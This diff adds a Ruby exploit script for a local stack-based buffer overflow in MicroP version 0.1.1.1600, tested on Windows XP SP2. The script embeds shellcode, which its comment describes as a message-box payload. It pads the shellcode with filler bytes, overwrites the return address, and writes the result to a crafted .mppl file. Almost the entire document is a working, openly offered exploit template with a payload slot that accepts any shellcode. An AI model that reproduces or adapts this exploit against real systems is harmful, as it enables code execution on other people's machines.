@@ -1,0 +1,44 @@
+#!/usr/bin/env ruby
+# Exploit Title:MicroP(.mppl) Local Stack Based Buffer Overflow
+# Author:Necmettin COSKUN => twitter.com/babayarisi
+# Blog  : http://www.ncoskun.com http://www.grisapka.org
+# Vendor :http://sourceforge.net/projects/microp/
+# Software link:http://sourceforge.net/projects/microp/files/latest/download
+# version: 0.1.1.1600
+# Tested on: windows XP sp2
+# 4ewa2getha! ;)
+
+print "\n"
+  print "\n"
+  print "   by\n"                                      
+  print "    _       _                   _  v2 _   \n"
+  print "   | |_ ___| |_ ___ _ _ ___ ___|_|___|_|  \n"
+  print "   | . | .'| . | .'| | | .'|  _| |_ -| |  \n"
+  print "   |___|__,|___|__,|_  |__,|_| |_|___|_|  \n"
+  print "                   |___|                  \n"                
+  print "                                          \n"
+  print "\n"
+  print "\n"
+	 
+
+#shellcode = http://www.exploit-db.com/exploits/28996/ 
+#User32-free Messagebox Shellcode for any Windows version
+ 
+ babacode =
+   "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"+
+   "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"+
+   "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"+
+   "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"+
+   "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"+
+   "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"+
+   "\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"+
+   "\x49\x0b\x31\xc0\x51\x50\xff\xd7"
+dolgu = "\x41" * 1163 
+eip = [0x100145B5].pack('V') 
+
+bumbala=babacode+dolgu+eip
+
+File.open('baba.mppl', 'w') do |bofdosya|  
+bofdosya.puts (bumbala)
+bofdosya.close()
+end
